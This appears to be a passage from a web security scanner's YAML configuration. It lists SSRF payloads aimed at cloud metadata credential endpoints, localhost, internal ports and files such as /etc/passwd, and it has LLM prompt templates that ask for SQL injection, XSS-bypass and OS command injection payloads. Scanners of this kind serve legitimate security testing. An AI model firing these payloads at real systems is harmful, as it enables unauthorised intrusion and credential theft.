ssrf:
  # ── Cloud metadata endpoints ──────────────────────────────────────────
  - "http://169.254.169.254/latest/meta-data/"
  - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  - "http://metadata.google.internal/computeMetadata/v1/"
  - "http://169.254.169.254/metadata/instance"
  # ── Internal services ─────────────────────────────────────────────────
  - "http://localhost/"
  - "http://127.0.0.1/"
  - "http://[::1]/"
  - "http://0.0.0.0/"
  # ── File read via file:// ─────────────────────────────────────────────
  - "file:///etc/passwd"
  - "file:///etc/hosts"
  - "file:///proc/self/environ"
  # ── Internal port scan probes ─────────────────────────────────────────
  - "http://127.0.0.1:22/"
  - "http://127.0.0.1:3306/"
  - "http://127.0.0.1:6379/"

# LLM prompt templates for context-aware payload generation
llm_prompts:
  sqli: |
    You are a web security expert. Generate SQL injection test payloads for a field named "{field_name}"
    on endpoint "{url}". Consider the field context and generate 5 diverse payloads that test for:
    1. Error-based SQLi
    2. Boolean-based blind SQLi
    3. Time-based blind SQLi
    Output ONLY a JSON array of strings, nothing else. Example: ["payload1", "payload2"]

  xss: |
    You are a web security expert. Generate XSS test payloads for a field named "{field_name}"
    on endpoint "{url}". Generate 5 diverse payloads that test reflected and stored XSS.
    Consider filter bypasses. Output ONLY a JSON array of strings, nothing else.

  os: |
    You are a web security expert. Generate OS command injection test payloads for a field named
    "{field_name}" on endpoint "{url}". Generate 5 payloads for both Unix and Windows systems.
    Output ONLY a JSON array of strings, nothing else.
